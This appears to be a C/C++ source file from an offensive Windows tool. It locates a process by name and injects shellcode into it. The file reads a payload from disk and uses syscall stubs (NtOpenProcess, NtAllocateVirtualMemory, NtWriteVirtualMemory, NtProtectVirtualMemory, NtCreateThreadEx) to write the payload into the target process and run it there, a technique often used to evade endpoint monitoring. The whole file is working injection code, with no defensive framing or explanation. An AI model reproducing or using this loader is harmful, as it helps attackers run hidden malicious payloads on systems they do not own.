# define _CRT_SECURE_NO_WARNINGS
# include "custom-syscall-stub.h"
# include "injection.h"
# include <TlHelp32.h>
# include <windows.h>

void RtlInitUnicodeString(PUNICODE_STRING DestinationString, wchar_t* SourceString) {
    //if (DestinationString == NULL) return;

    if (SourceString) {
        SIZE_T length = wcslen(SourceString) * sizeof(WCHAR); // Allocating memory for the string
        DestinationString->Buffer = (PWSTR)SourceString;
        DestinationString->Length = (USHORT)length; // Size of string in "BYTES"
        DestinationString->MaximumLength = (USHORT)(length + sizeof(WCHAR));
    }
    else {
        DestinationString->Buffer = NULL;
        DestinationString->Length = 0;
        DestinationString->MaximumLength = 0;
    }
}

#ifndef FILE_STANDARD_INFORMATION
typedef struct _FILE_STANDARD_INFORMATION {
    LARGE_INTEGER   AllocationSize;
    LARGE_INTEGER   EndOfFile;
    ULONG           NumberOfLinks;
    BOOLEAN         DeletePending;
    BOOLEAN         Directory;
} FILE_STANDARD_INFORMATION;
#endif

//----------------------------------------------------------------------------------------------------------

# pragma region findPID

int findPID(char *Proc) {
    int len = MultiByteToWideChar(CP_UTF8, 0, Proc, -1, NULL, 0);
    wchar_t* wcharProc = new wchar_t[len];
    MultiByteToWideChar(CP_UTF8, 0, Proc, -1, wcharProc, len);

    // Creating a snapshot of all the process
    HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapShot == NULL) {
        yapBad("There was an error taking snapshot of all proecss");
        return NULL;
    }
    PROCESSENTRY32 procInfo = { 0 }; // Structure that will hold the information of the process.
    procInfo.dwSize = sizeof(PROCESSENTRY32);

    // Loop to find the process required
    if (Process32First(hSnapShot, &procInfo)) {
        BOOL nextProc = TRUE;
        while (nextProc) {
            if (wcscmp(wcharProc, procInfo.szExeFile) == 0) {
                yapOkay("Found process [%ls] with PID [%d]", wcharProc, procInfo.th32ProcessID);
                delete[] wcharProc;
                CloseHandle(hSnapShot);
                return procInfo.th32ProcessID;
            }
            nextProc = Process32Next(hSnapShot, &procInfo);
        }
        yapBad("Process [%ls] was not found", wcharProc);
        delete[] wcharProc;
        CloseHandle(hSnapShot);
    }

    return EXIT_FAILURE;
}

# pragma endregion

//----------------------------------------------------------------------------------------------------------

BOOL ShellcodeInjection(int PID, char* filename) {
    size_t sizeofShellcode, bytes_written = 0;
    HANDLE pHandle, tHandle = INVALID_HANDLE_VALUE;
    unsigned char shellcode[9256] = { 0 };
    DWORD OldProtect = NULL;
    LPVOID baseAddr = NULL;
    FILE* fHandle = NULL;

    if (fopen_s(&fHandle, filename, "rb") != 0) {
        yapBad("There was an error opening handle to the file");
        return FALSE;
    }
    yapOkay("A handle [0x%p] to the file was successfully opened", fHandle);

    sizeofShellcode = fread(shellcode, 1, 9256, fHandle);
    if (sizeofShellcode == 0 || sizeofShellcode <= 0) {
        fclose(fHandle);
        return FALSE;
    }
    yapOkay("Shellcode was sucessfully copied into the memory [0x%p]", shellcode);
    fclose(fHandle);

    OBJECT_ATTRIBUTES objectAttributes;
    InitializeObjectAttributes(&objectAttributes, NULL, 0, NULL, NULL);

    CLIENT_ID clientId = { 0 };
    clientId.UniqueProcess = (HANDLE)PID;
    clientId.UniqueThread = NULL;

    // Get an handle for the PID
    NTSTATUS status = NtOpenProcess(&pHandle, PROCESS_ALL_ACCESS, &objectAttributes, &clientId);
    if (NT_SUCCESS(status)) {
        yapOkay("Sucessfully got handle [0x%p] for PID [%d]", pHandle, PID);
    }
    else {
        yapBad("Could not get handle for the PID [%d]", PID);
        CloseHandle(pHandle);
        return FALSE;
    }

    // Allocate memory in the target process's  memory space
    status = NtAllocateVirtualMemory(pHandle, &baseAddr, 0, &sizeofShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (NT_SUCCESS(status)) {
        yapOkay("Allocated memory at [0x%p]", baseAddr);
    }
    else {
        yapBad("Could not get allocate in the target process's memory space");
        CloseHandle(pHandle);
        return FALSE;
    }

    status = NtWriteVirtualMemory(pHandle, baseAddr, shellcode, sizeofShellcode, &bytes_written);
    if (NT_SUCCESS(status)) {
       yapOkay("Sucessfully copied shellcode into the allocated memory region");
    }
    else {
        yapBad("There was an error coping shellcode into the memory");
        NtFreeVirtualMemory(pHandle, &baseAddr, &sizeofShellcode, MEM_DECOMMIT);
        NtClose(pHandle);
        return FALSE;
    }

    status = NtProtectVirtualMemory(pHandle, &baseAddr, &sizeofShellcode, PAGE_EXECUTE_READ, &OldProtect);
    if (NT_SUCCESS(status)) {
        yapOkay("Changed permission for the memory region [0x%p] from [PAGE_READWRITE] to [PAGE_EXECUTE_READ]", baseAddr);
    }
    else {
        yapBad("There was an error changing permission of the allocated memory region");
        NtFreeVirtualMemory(pHandle, &baseAddr, &sizeofShellcode, MEM_DECOMMIT);
        NtClose(pHandle);
        return FALSE;
    }

    status = NtCreateThreadEx(&tHandle, THREAD_ALL_ACCESS, NULL, pHandle, baseAddr, NULL, FALSE, 0, 0, 0, NULL);
    if (NT_SUCCESS(status)) {
        yapOkay("Created a remote thread, Handle [0x%p]", tHandle);
    }
    else {
        printf("Failed to create a remote thread");
        NtFreeVirtualMemory(pHandle, &baseAddr, &sizeofShellcode, MEM_DECOMMIT);
        NtClose(tHandle);
        NtClose(pHandle);
    }

    NtWaitForSingleObject(tHandle, FALSE, NULL);
    NtFreeVirtualMemory(pHandle, &baseAddr, &sizeofShellcode, MEM_DECOMMIT);
    NtClose(tHandle);
    NtClose(pHandle);
    return TRUE;
}
